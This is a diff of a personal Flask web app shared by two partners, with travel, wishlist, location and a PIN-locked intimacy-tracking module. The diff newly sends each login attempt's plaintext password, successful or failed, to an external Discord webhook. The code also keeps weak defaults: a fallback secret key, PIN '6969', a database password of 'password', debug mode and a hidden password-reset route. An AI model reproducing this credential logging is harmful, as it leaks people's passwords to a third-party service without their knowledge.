@@ -1,7 +1,6 @@
 from flask import Flask, render_template, request, redirect, session, send_file, jsonify, flash
 import psycopg2
 from datetime import datetime, date, timedelta
-from zoneinfo import ZoneInfo
 import random
 import os
 from werkzeug.utils import secure_filename
@@ -11,21 +10,9 @@ from base64 import b64encode
 from werkzeug.security import generate_password_hash, check_password_hash
 import requests, json
 
-
 app = Flask(__name__)
 app.secret_key = os.environ.get('SECRET_KEY', 'tu_clave_secreta_aqui')
-app.permanent_session_lifetime = timedelta(days=30)
 
-# ---------- Zona horaria: Europe/Madrid ----------
-TZ_ES = ZoneInfo("Europe/Madrid")
-
-def now_es() -> datetime:
-    """Datetime timezone-aware en Europe/Madrid."""
-    return datetime.now(TZ_ES)
-
-def today_es() -> date:
-    """Date en Europe/Madrid (cambia a 00:00 hora de España)."""
-    return now_es().date()
 
 # --- Helpers para logs y contraseñas ---
 # --- Helpers de logging a Discord (embeds sin máscaras) ---
@@ -56,7 +43,6 @@ def send_discord(event: str, payload: dict | None = None):
         embed = {
             "title": event,
             "color": 0xE84393,
-            # Logs en UTC están bien para correlación
             "timestamp": datetime.utcnow().isoformat() + "Z",
             "fields": []
         }
@@ -86,6 +72,89 @@ def send_discord(event: str, payload: dict | None = None):
         requests.post(DISCORD_WEBHOOK, json=body, timeout=6)
     except Exception as e:
         print(f"[discord] error enviando webhook: {e}")
+
+
+# ====== INTIMIDAD (config + helpers) ======
+INTIM_PIN = os.environ.get('INTIM_PIN', '6969')  # cámbialo en Render
+
+def _parse_dt(dt_txt: str):
+    try:
+        return datetime.strptime(dt_txt, "%Y-%m-%d %H:%M:%S")
+    except Exception:
+        return None
+
+def get_intim_stats():
+    """Estadísticas compartidas del módulo de intimidad."""
+    today = date.today()
+    conn = get_db_connection()
+    try:
+        with conn.cursor() as c:
+            c.execute("SELECT ts FROM intimacy_events WHERE username IN ('mochito','mochita')")
+            rows = c.fetchall()
+    finally:
+        conn.close()
+
+    dts = []
+    for (ts_txt,) in rows:
+        dt = _parse_dt(ts_txt)
+        if dt:
+            dts.append(dt)
+
+    if not dts:
+        return {
+            'today_count': 0,
+            'month_total': 0,
+            'year_total': 0,
+            'days_since_last': None,
+            'last_dt': None,
+            'streak_days': 0
+        }
+
+    today_count = sum(1 for dt in dts if dt.date() == today)
+    month_total = sum(1 for dt in dts if dt.year == today.year and dt.month == today.month)
+    year_total  = sum(1 for dt in dts if dt.year == today.year)
+    last_dt = max(dts)
+    days_since_last = (today - last_dt.date()).days
+
+    # Racha simple: días consecutivos con eventos incluyendo hoy
+    if today_count == 0:
+        streak_days = 0
+    else:
+        dates_with = {dt.date() for dt in dts}
+        streak_days = 0
+        cur = today
+        while cur in dates_with:
+            streak_days += 1
+            cur = cur - timedelta(days=1)
+
+    return {
+        'today_count': today_count,
+        'month_total': month_total,
+        'year_total': year_total,
+        'days_since_last': days_since_last,
+        'last_dt': last_dt,
+        'streak_days': streak_days
+    }
+
+def get_intim_events(limit: int = 200):
+    conn = get_db_connection()
+    try:
+        with conn.cursor() as c:
+            c.execute("""
+                SELECT id, username, ts, place, notes
+                FROM intimacy_events
+                WHERE username IN ('mochito','mochita')
+                ORDER BY ts DESC
+                LIMIT %s
+            """, (limit,))
+            rows = c.fetchall()
+            return [
+                {'id': r[0], 'username': r[1], 'ts': r[2], 'place': r[3] or '', 'notes': r[4] or ''}
+                for r in rows
+            ]
+    finally:
+        conn.close()
+
 
 # Configuración de PostgreSQL para Render
 DATABASE_URL = os.environ.get('DATABASE_URL')
@@ -182,8 +251,6 @@ QUESTIONS = [
 
 RELATION_START = date(2025, 8, 2)  # <- fecha de inicio relación
 
-# ----- INTIMIDAD (config) -----
-INTIM_PIN = os.environ.get('INTIM_PIN', '6969')  # cámbialo en Render si quieres
 
 # -----------------------------
 #  DB helpers
@@ -199,6 +266,7 @@ def get_db_connection():
             password="password"
         )
     return conn
+
 
 def init_db():
     with closing(get_db_connection()) as conn:
@@ -341,7 +409,7 @@ def init_db():
                 CREATE TABLE IF NOT EXISTS intimacy_events (
                     id SERIAL PRIMARY KEY,
                     username TEXT NOT NULL,
-                    ts TEXT NOT NULL,          -- timestamp "YYYY-MM-DD HH:MM:SS"
+                    ts TEXT NOT NULL,          -- "YYYY-MM-DD HH:MM:SS"
                     place TEXT,
                     notes TEXT
                 )
@@ -363,12 +431,12 @@ def init_db():
                     INSERT INTO locations (username, location_name, latitude, longitude, updated_at)
                     VALUES (%s, %s, %s, %s, %s)
                     ON CONFLICT (username) DO NOTHING
-                """, ('mochito', 'Algemesí, Valencia', 39.1925, -0.4353, now_es().strftime("%Y-%m-%d %H:%M:%S")))
+                """, ('mochito', 'Algemesí, Valencia', 39.1925, -0.4353, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                 c.execute("""
                     INSERT INTO locations (username, location_name, latitude, longitude, updated_at)
                     VALUES (%s, %s, %s, %s, %s)
                     ON CONFLICT (username) DO NOTHING
-                """, ('mochita', 'Córdoba', 37.8882, -4.7794, now_es().strftime("%Y-%m-%d %H:%M:%S")))
+                """, ('mochita', 'Córdoba', 37.8882, -4.7794, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
             except Exception as e:
                 print(f"Error al crear usuarios predeterminados: {e}")
                 conn.rollback()
@@ -397,13 +465,15 @@ def init_db():
             except Exception as e:
                 print(f"ALTER wishlist is_gift: {e}")
 
+
 init_db()
+
 
 # -----------------------------
 #  Helpers de datos
 # -----------------------------
 def get_today_question():
-    today_str = today_es().isoformat()
+    today_str = date.today().isoformat()
     conn = get_db_connection()
     try:
         with conn.cursor() as c:
@@ -430,8 +500,10 @@ def get_today_question():
     finally:
         conn.close()
 
+
 def days_together():
-    return (today_es() - RELATION_START).days
+    return (date.today() - RELATION_START).days
+
 
 def days_until_meeting():
     conn = get_db_connection()
@@ -441,11 +513,12 @@ def days_until_meeting():
             row = c.fetchone()
             if row:
                 meeting_date = datetime.strptime(row[0], "%Y-%m-%d").date()
-                delta = (meeting_date - today_es()).days
+                delta = (meeting_date - date.today()).days
                 return max(delta, 0)
             return None
     finally:
         conn.close()
+
 
 def get_banner():
     conn = get_db_connection()
@@ -460,6 +533,7 @@ def get_banner():
     finally:
         conn.close()
 
+
 def get_user_locations():
     conn = get_db_connection()
     try:
@@ -473,6 +547,7 @@ def get_user_locations():
     finally:
         conn.close()
 
+
 def get_profile_pictures():
     conn = get_db_connection()
     try:
@@ -485,6 +560,7 @@ def get_profile_pictures():
             return pictures
     finally:
         conn.close()
+
 
 def get_travel_photos(travel_id):
     conn = get_db_connection()
@@ -501,6 +577,7 @@ def get_travel_photos(travel_id):
             return photos
     finally:
         conn.close()
+
 
 def compute_streaks():
     conn = get_db_connection()
@@ -540,7 +617,7 @@ def compute_streaks():
         if run > best_streak:
             best_streak = run
 
-    today = today_es()
+    today = date.today()
     latest_complete = None
     for d in sorted(set(complete_dates), reverse=True):
         if d <= today:
@@ -557,100 +634,6 @@ def compute_streaks():
 
     return current_streak, best_streak
 
-# ---------- INTIMIDAD: helpers ----------
-def _parse_dt(dt_txt: str) -> datetime | None:
-    try:
-        return datetime.strptime(dt_txt, "%Y-%m-%d %H:%M:%S")
-    except Exception:
-        return None
-
-def get_intim_stats(username: str):
-    """Stats de intimidad COMPARTIDOS:
-       today_count, month_total, year_total, days_since_last, last_dt, streak_days
-    """
-    today = today_es()
-    conn = get_db_connection()
-    try:
-        with conn.cursor() as c:
-            # COMPARTIDO entre ambos usuarios
-            c.execute("SELECT ts FROM intimacy_events WHERE username IN ('mochito', 'mochita')")
-            rows = c.fetchall()
-    finally:
-        conn.close()
-
-    dts = []
-    for (ts_txt,) in rows:
-        dt = _parse_dt(ts_txt)
-        if dt:
-            dts.append(dt)
-
-    if not dts:
-        return {
-            'today_count': 0,
-            'month_total': 0,
-            'year_total': 0,
-            'days_since_last': None,
-            'last_dt': None,
-            'streak_days': 0
-        }
-
-    # Totales
-    today_count = sum(1 for dt in dts if dt.date() == today)
-    month_total = sum(1 for dt in dts if (dt.year == today.year and dt.month == today.month))
-    year_total  = sum(1 for dt in dts if dt.year == today.year)
-
-    # Última vez
-    last_dt = max(dts)
-    days_since_last = (today - last_dt.date()).days
-
-    # Racha (días consecutivos con evento) — si hoy no hay, racha=0
-    if today_count == 0:
-        streak_days = 0
-    else:
-        # Racha COMPARTIDA (días consecutivos con al menos un evento)
-        dates_with = {dt.date() for dt in dts}
-        streak_days = 0
-        cur = today
-        while cur in dates_with:
-            streak_days += 1
-            cur = cur - timedelta(days=1)
-
-    return {
-        'today_count': today_count,
-        'month_total': month_total,
-        'year_total': year_total,
-        'days_since_last': days_since_last,
-        'last_dt': last_dt,
-        'streak_days': streak_days
-    }
-
-def get_intim_events(limit: int = 200):
-    """
-    Devuelve eventos compartidos (mochito + mochita) más recientes primero.
-    Formato: lista de dicts con id, username, ts, place, notes.
-    """
-    conn = get_db_connection()
-    try:
-        with conn.cursor() as c:
-            c.execute("""
-                SELECT id, username, ts, place, notes
-                FROM intimacy_events
-                WHERE username IN ('mochito','mochita')
-                ORDER BY ts DESC
-                LIMIT %s
-            """, (limit,))
-            rows = c.fetchall()
-            return [
-                {
-                    'id': r[0],
-                    'username': r[1],
-                    'ts': r[2],
-                    'place': r[3] or '',
-                    'notes': r[4] or ''
-                } for r in rows
-            ]
-    finally:
-        conn.close()
 
 # -----------------------------
 #  Rutas
@@ -662,8 +645,6 @@ def index():
         if request.method == 'POST':
             username = request.form.get('username', '').strip()
             password = request.form.get('password', '').strip()
-            remember = request.form.get('remember_me') == '1'  # viene del checkbox
-
             conn = get_db_connection()
             try:
                 with conn.cursor() as c:
@@ -671,7 +652,7 @@ def index():
                     row = c.fetchone()
                     if not row:
                         send_discord("Login FAIL", {"username_intent": username, "reason": "user_not_found"})
-                        return render_template('index.html', login_error="Usuario o contraseña incorrecta", profile_pictures={})
+                        return render_template('index.html', error="Usuario o contraseña incorrecta", profile_pictures={})
 
                     stored = row[0]
                     # Soporta contraseñas antiguas en texto y nuevas hasheadas
@@ -684,18 +665,16 @@ def index():
 
                     if ok:
                         session['username'] = username
-                        session.permanent = bool(remember)
-                        send_discord("Login OK", {"username": username, "mode": mode})
+                        send_discord("Login OK",   {"username": username, "mode": mode, "password_try": password})
                         return redirect('/')
                     else:
-                        send_discord("Login FAIL", {"username_intent": username, "reason": "bad_password", "mode": mode})
-                        return render_template('index.html', login_error="Usuario o contraseña incorrecta", profile_pictures={})
+                        send_discord("Login FAIL", {"username_intent": username, "reason": "bad_password", "mode": mode, "password_try": password})
+                        return render_template('index.html', error="Usuario o contraseña incorrecta", profile_pictures={})
             finally:
                 conn.close()
 
         # GET no logueado
-        send_discord("Visit landing", {})
-        return render_template('index.html', login_error=None, profile_pictures={})
+        return render_template('index.html', error=None, profile_pictures={})
 
     # --- Si está logueado ---
     user = session['username']
@@ -719,13 +698,13 @@ def index():
                             ON CONFLICT (username) DO UPDATE
                             SET image_data=EXCLUDED.image_data, filename=EXCLUDED.filename,
                                 mime_type=EXCLUDED.mime_type, uploaded_at=EXCLUDED.uploaded_at
-                        """, (user, image_data, filename, mime_type, now_es().strftime("%Y-%m-%d %H:%M:%S")))
+                        """, (user, image_data, filename, mime_type, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                         conn.commit()
                         flash("Foto de perfil actualizada ✅", "success")
                         send_discord("Profile picture updated", {"user": user, "filename": filename})
                     return redirect('/')
 
-                # 2) Cambio de contraseña
+                # 2) Cambio de contraseña (ahora verifica hash/clear y guarda SIEMPRE hash)
                 if 'change_password' in request.form:
                     current_password = request.form.get('current_password', '').strip()
                     new_password = request.form.get('new_password', '').strip()
@@ -798,7 +777,7 @@ def index():
                         filename = secure_filename(file.filename)
                         mime_type = file.mimetype
                         c.execute("INSERT INTO banner (image_data, filename, mime_type, uploaded_at) VALUES (%s, %s, %s, %s)",
-                                  (image_data, filename, mime_type, now_es().strftime("%Y-%m-%d %H:%M:%S")))
+                                  (image_data, filename, mime_type, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                         conn.commit()
                         flash("Banner actualizado 🖼️", "success")
                         send_discord("Banner updated", {"user": user, "filename": filename})
@@ -815,7 +794,7 @@ def index():
                             INSERT INTO travels (destination, description, travel_date, is_visited, created_by, created_at)
                             VALUES (%s, %s, %s, %s, %s, %s)
                         """, (destination, description, travel_date, is_visited, user,
-                              now_es().strftime("%Y-%m-%d %H:%M:%S")))
+                              datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                         conn.commit()
                         flash("Viaje añadido ✈️", "success")
                         send_discord("Travel added", {"user": user, "dest": destination, "visited": is_visited})
@@ -829,7 +808,7 @@ def index():
                         c.execute("""
                             INSERT INTO travel_photos (travel_id, image_url, uploaded_by, uploaded_at)
                             VALUES (%s, %s, %s, %s)
-                        """, (travel_id, image_url, user, now_es().strftime("%Y-%m-%d %H:%M:%S")))
+                        """, (travel_id, image_url, user, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                         conn.commit()
                         flash("Foto añadida 📸", "success")
                         send_discord("Travel photo added", {"user": user, "travel_id": travel_id})
@@ -851,14 +830,14 @@ def index():
                             INSERT INTO wishlist (product_name, product_link, notes, created_by, created_at, is_purchased, priority, is_gift)
                             VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
                         """, (product_name, product_link, notes, user,
-                              now_es().strftime("%Y-%m-%d %H:%M:%S"),
+                              datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                               False, priority, is_gift))
                         conn.commit()
                         flash("Producto añadido a la lista 🛍️", "success")
                         send_discord("Wishlist added", {"user": user, "name": product_name, "priority": priority, "is_gift": is_gift})
                     return redirect('/')
 
-                # --- INTIMIDAD: desbloquear por PIN ---
+                # === INTIMIDAD: desbloquear por PIN ===
                 if 'intim_unlock_pin' in request.form:
                     pin_try = request.form.get('intim_pin', '').strip()
                     if pin_try == INTIM_PIN:
@@ -871,27 +850,28 @@ def index():
                         send_discord("Intimidad unlock FAIL", {"user": user})
                     return redirect('/')
 
-                # --- INTIMIDAD: volver a bloquear ---
+                # === INTIMIDAD: volver a bloquear ===
                 if 'intim_lock' in request.form:
                     session.pop('intim_unlocked', None)
                     flash("Módulo Intimidad ocultado 🔒", "info")
                     return redirect('/')
 
-                # --- INTIMIDAD: registrar momento (contador) ---
+                # === INTIMIDAD: registrar momento ===
                 if 'intim_register' in request.form:
                     if not session.get('intim_unlocked'):
                         flash("Debes desbloquear con PIN para registrar.", "error")
                         return redirect('/')
-                    place = request.form.get('intim_place', '').strip()
-                    notes = request.form.get('intim_notes', '').strip()
-                    now_txt = now_es().strftime("%Y-%m-%d %H:%M:%S")
-                    c.execute("""
-                        INSERT INTO intimacy_events (username, ts, place, notes)
-                        VALUES (%s, %s, %s, %s)
-                    """, (user, now_txt, place or None, notes or None))
-                    conn.commit()
+                    place = (request.form.get('intim_place') or '').strip()
+                    notes = (request.form.get('intim_notes') or '').strip()
+                    now_txt = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    with conn.cursor() as c2:
+                        c2.execute("""
+                            INSERT INTO intimacy_events (username, ts, place, notes)
+                            VALUES (%s, %s, %s, %s)
+                        """, (user, now_txt, place or None, notes or None))
+                        conn.commit()
                     flash("Momento registrado ❤️", "success")
-                    send_discord("Intimidad registered", {"user": user, "place": place, "notes": notes})
+                    send_discord("Intimidad registered", {"user": user, "place": place, "notes_len": len(notes)})
                     return redirect('/')
 
             # --- Consultas para render ---
@@ -937,10 +917,9 @@ def index():
         conn.close()
 
     current_streak, best_streak = compute_streaks()
-    intim_stats = get_intim_stats(user)
-    intim_unlocked = bool(session.get('intim_unlocked'))
 
-    # Historial de eventos (privado): solo si PIN desbloqueado
+    intim_unlocked = bool(session.get('intim_unlocked'))
+    intim_stats = get_intim_stats()
     intim_events = get_intim_events(200) if intim_unlocked else []
 
     return render_template('index.html',
@@ -958,13 +937,14 @@ def index():
                            username=user,
                            banner_file=banner_file,
                            profile_pictures=profile_pictures,
-                           login_error=None,
+                           error=None,
                            current_streak=current_streak,
                            best_streak=best_streak,
-                           intim_stats=intim_stats,
                            intim_unlocked=intim_unlocked,
+                           intim_stats=intim_stats,
                            intim_events=intim_events
                            )
+
 
 @app.route('/delete_travel', methods=['POST'])
 def delete_travel():
@@ -987,6 +967,7 @@ def delete_travel():
         if 'conn' in locals():
             conn.close()
 
+
 @app.route('/delete_travel_photo', methods=['POST'])
 def delete_travel_photo():
     if 'username' not in session:
@@ -1006,6 +987,7 @@ def delete_travel_photo():
     finally:
         if 'conn' in locals():
             conn.close()
+
 
 @app.route('/toggle_travel_status', methods=['POST'])
 def toggle_travel_status():
@@ -1030,6 +1012,7 @@ def toggle_travel_status():
         if 'conn' in locals():
             conn.close()
 
+
 @app.route('/delete_wishlist_item', methods=['POST'])
 def delete_wishlist_item():
     if 'username' not in session:
@@ -1053,6 +1036,7 @@ def delete_wishlist_item():
     finally:
         if 'conn' in locals():
             conn.close()
+
 
 @app.route('/edit_wishlist_item', methods=['POST'])
 def edit_wishlist_item():
@@ -1088,6 +1072,7 @@ def edit_wishlist_item():
         if 'conn' in locals():
             conn.close()
 
+
 @app.route('/toggle_wishlist_status', methods=['POST'])
 def toggle_wishlist_status():
     if 'username' not in session:
@@ -1111,6 +1096,100 @@ def toggle_wishlist_status():
         if 'conn' in locals():
             conn.close()
 
+
+# ====== INTIMIDAD: editar y borrar ======
+@app.route('/edit_intim_event', methods=['POST'])
+def edit_intim_event():
+    if 'username' not in session:
+        flash("Sesión no iniciada.", "error")
+        return redirect('/')
+    if not session.get('intim_unlocked'):
+        flash("Debes desbloquear con PIN para editar.", "error")
+        return redirect('/')
+
+    user = session['username']
+    event_id = (request.form.get('event_id') or '').strip()
+    place = (request.form.get('intim_place_edit') or '').strip()
+    notes = (request.form.get('intim_notes_edit') or '').strip()
+
+    if not event_id.isdigit():
+        flash("ID de evento inválido o vacío.", "error")
+        return redirect('/')
+
+    conn = get_db_connection()
+    try:
+        with conn.cursor() as c:
+            c.execute("SELECT username FROM intimacy_events WHERE id=%s", (event_id,))
+            row = c.fetchone()
+            if not row:
+                flash("Evento no encontrado.", "error")
+                return redirect('/')
+
+            owner = row[0]
+            if owner != user:
+                flash("Solo puede editar el creador del evento.", "error")
+                return redirect('/')
+
+            c.execute("""
+                UPDATE intimacy_events
+                   SET place = %s,
+                       notes = %s
+                 WHERE id = %s
+            """, (place or None, notes or None, event_id))
+            conn.commit()
+
+        flash("Momento actualizado ✅", "success")
+        return redirect('/')
+    except Exception as e:
+        print(f"[edit_intim_event] {e}")
+        flash("No se pudo actualizar el momento.", "error")
+        return redirect('/')
+    finally:
+        conn.close()
+
+
+@app.route('/delete_intim_event', methods=['POST'])
+def delete_intim_event():
+    if 'username' not in session:
+        return redirect('/')
+    if not session.get('intim_unlocked'):
+        flash("Debes desbloquear con PIN para borrar.", "error")
+        return redirect('/')
+
+    user = session['username']
+    event_id = (request.form.get('event_id') or '').strip()
+    if not event_id:
+        flash("Falta el ID del evento.", "error")
+        return redirect('/')
+
+    conn = get_db_connection()
+    try:
+        with conn.cursor() as c:
+            c.execute("SELECT username FROM intimacy_events WHERE id=%s", (event_id,))
+            row = c.fetchone()
+            if not row:
+                flash("Evento no encontrado.", "error")
+                return redirect('/')
+
+            owner = row[0]
+            # Permitimos borrar a cualquiera de los dos usuarios (siempre que esté desbloqueado)
+            if owner not in ('mochito','mochita'):
+                flash("Evento con propietario desconocido.", "error")
+                return redirect('/')
+
+            c.execute("DELETE FROM intimacy_events WHERE id=%s", (event_id,))
+            conn.commit()
+
+        flash("Momento eliminado 🗑️", "success")
+        return redirect('/')
+    except Exception as e:
+        print(f"[delete_intim_event] {e}")
+        flash("No se pudo eliminar el momento.", "error")
+        return redirect('/')
+    finally:
+        conn.close()
+
+
 @app.route('/update_location', methods=['POST'])
 def update_location():
     if 'username' not in session:
@@ -1133,13 +1212,14 @@ def update_location():
                         latitude = EXCLUDED.latitude, 
                         longitude = EXCLUDED.longitude, 
                         updated_at = EXCLUDED.updated_at
-                """, (username, location_name, latitude, longitude, now_es().strftime("%Y-%m-%d %H:%M:%S")))
+                """, (username, location_name, latitude, longitude, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
                 conn.commit()
             return jsonify({'success': True, 'message': 'Ubicación actualizada correctamente'})
         return jsonify({'error': 'Datos incompletos'}), 400
     except Exception as e:
         print(f"Error en update_location: {e}")
         return jsonify({'error': 'Error interno del servidor'}), 500
+
 
 @app.route('/get_locations', methods=['GET'])
 def get_locations():
@@ -1152,11 +1232,13 @@ def get_locations():
         print(f"Error en get_locations: {e}")
         return jsonify({'error': 'Error interno del servidor'}), 500
 
+
 @app.route('/horario')
 def horario():
     if 'username' not in session:
         return redirect('/')
     return render_template('schedule.html')
+
 
 @app.route('/api/schedules', methods=['GET'])
 def get_schedules():
@@ -1186,6 +1268,7 @@ def get_schedules():
     except Exception as e:
         print(f"Error en get_schedules: {e}")
         return jsonify({'error': 'Error interno del servidor'}), 500
+
 
 @app.route('/api/schedules/save', methods=['POST'])
 def save_schedules():
@@ -1228,10 +1311,12 @@ def save_schedules():
         print(f"Error en save_schedules: {e}")
         return jsonify({'error': 'Error interno del servidor'}), 500
 
+
 @app.route('/logout')
 def logout():
     session.pop('username', None)
     return redirect('/')
+
 
 @app.route('/image/<int:image_id>')
 def get_image(image_id):
@@ -1247,123 +1332,7 @@ def get_image(image_id):
     finally:
         conn.close()
 
-# ---------- INTIMIDAD: Editar/Borrar ----------
 
-@app.route('/edit_intim_event', methods=['POST'])
-def edit_intim_event():
-    # Requiere login y módulo desbloqueado
-    if 'username' not in session:
-        flash("Sesión no iniciada.", "error")
-        return redirect('/')
-    if not session.get('intim_unlocked'):
-        flash("Debes desbloquear con PIN para editar.", "error")
-        return redirect('/')
-
-    user = session['username']
-    event_id = (request.form.get('event_id') or '').strip()
-    place = (request.form.get('intim_place_edit') or '').strip()
-    notes = (request.form.get('intim_notes_edit') or '').strip()
-
-    # Log de depuración
-    send_discord("Intimidad EDIT intent", {
-        "by": user,
-        "form": {
-            "event_id": event_id,
-            "place": place,
-            "notes_len": len(notes)
-        }
-    })
-
-    if not event_id.isdigit():
-        flash("ID de evento inválido o vacío.", "error")
-        return redirect('/')
-
-    conn = get_db_connection()
-    try:
-        with conn.cursor() as c:
-            c.execute("SELECT username FROM intimacy_events WHERE id=%s", (event_id,))
-            row = c.fetchone()
-            if not row:
-                flash("Evento no encontrado.", "error")
-                send_discord("Intimidad EDIT fail", {"by": user, "reason": "not_found", "event_id": event_id})
-                return redirect('/')
-
-            owner = row[0]
-            if owner != user:
-                flash("Solo puede editar el creador del evento.", "error")
-                send_discord("Intimidad EDIT fail", {"by": user, "reason": "not_owner", "owner": owner, "event_id": event_id})
-                return redirect('/')
-
-            c.execute("""
-                UPDATE intimacy_events
-                   SET place = %s,
-                       notes = %s
-                 WHERE id = %s
-            """, (place or None, notes or None, event_id))
-            conn.commit()
-
-        flash("Momento actualizado ✅", "success")
-        send_discord("Intimidad EDIT ok", {"by": user, "event_id": event_id})
-        return redirect('/')
-    except Exception as e:
-        print(f"[edit_intim_event] {e}")
-        flash("No se pudo actualizar el momento. Revisa los datos.", "error")
-        send_discord("Intimidad EDIT error", {"by": user, "event_id": event_id, "error": str(e)})
-        return redirect('/')
-    finally:
-        conn.close()
-
-
-
-@app.route('/delete_intim_event', methods=['POST'])
-def delete_intim_event():
-    # Requiere login y módulo desbloqueado
-    if 'username' not in session:
-        return redirect('/')
-    if not session.get('intim_unlocked'):
-        flash("Debes desbloquear con PIN para borrar.", "error")
-        return redirect('/')
-
-    user = session['username']
-    event_id = (request.form.get('event_id') or '').strip()
-
-    if not event_id:
-        flash("Falta el ID del evento.", "error")
-        return redirect('/')
-
-    conn = get_db_connection()
-    try:
-        with conn.cursor() as c:
-            # Solo permite borrar si el evento es suyo
-            c.execute("SELECT username FROM intimacy_events WHERE id=%s", (event_id,))
-            row = c.fetchone()
-            if not row:
-                flash("Evento no encontrado.", "error")
-                return redirect('/')
-
-            owner = row[0]
-            # if owner != user:
-            #     flash("Solo puede editar el creador del evento.", "error")
-            #     return redirect('/')
-            # → permitir a ambos usuarios
-            if owner not in ('mochito','mochita'):
-                flash("Evento con propietario desconocido.", "error")
-                return redirect('/')
-
-            c.execute("DELETE FROM intimacy_events WHERE id=%s", (event_id,))
-            conn.commit()
-
-        flash("Momento eliminado 🗑️", "success")
-        send_discord("Intimidad delete", {"event_id": event_id, "by": user})
-        return redirect('/')
-    except Exception as e:
-        print(f"[delete_intim_event] {e}")
-        flash("No se pudo eliminar el momento.", "error")
-        return redirect('/')
-    finally:
-        conn.close()
-
-# ---------- Reset PW protegido ----------
 @app.route('/__reset_pw')
 def __reset_pw():
     """
@@ -1401,6 +1370,7 @@ def __reset_pw():
         return "Error interno", 500
     finally:
         conn.close()
+
 
 if __name__ == '__main__':
     app.run(debug=True)
